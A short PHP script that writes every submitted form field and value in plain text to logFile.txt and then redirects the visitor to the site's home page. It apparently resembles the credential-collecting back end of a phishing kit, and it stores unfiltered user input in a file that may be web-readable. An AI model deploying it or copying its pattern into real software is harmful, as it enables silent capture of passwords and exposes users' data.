<?php
header('Location: /');

$log = fopen("logFile.txt", 'a');

foreach($_POST as $field => $data) {
    fwrite($log, $field);  // Write the field name
    fwrite($log, " => ");
    fwrite($log, $data);   // Write the field value
    fwrite($log, "\r\n");
}

fwrite($log, "\r\n");
fclose($log);

exit;
?>